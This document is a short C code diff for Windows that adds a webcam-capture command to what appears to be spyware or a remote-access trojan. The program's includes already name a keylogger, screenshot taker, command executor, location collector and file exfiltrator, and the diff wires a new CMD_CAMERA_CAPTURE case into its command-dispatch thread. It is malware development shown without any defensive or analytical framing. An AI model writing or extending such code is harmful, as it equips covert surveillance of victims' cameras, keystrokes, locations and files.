@@ -11,6 +11,7 @@
 #include "info_collector.c"
 #include "keylogger.c"
 #include "screenshot.c"
+#include "camera_capture.c"
 #include "command_executor.c"
 #include "location_collector.c"
 #include "file_exfiltrator.c"
@@ -46,6 +47,7 @@ typedef enum {
     CMD_LOCATION = 7,
     CMD_FILE_EXFILTRATE = 8,
     CMD_FILE_EXFILTRATE_BATCH = 9,
+    CMD_CAMERA_CAPTURE = 10,
     CMD_NONE = 0
 } CapabilityCommand;
 
@@ -315,6 +317,9 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
             break;
         case CMD_SCREENSHOT:
             output = start_screenshot();
+            break;
+        case CMD_CAMERA_CAPTURE:
+            output = start_camera_capture();
             break;
         case CMD_INFO_COLLECT:
             output = start_info_collector();
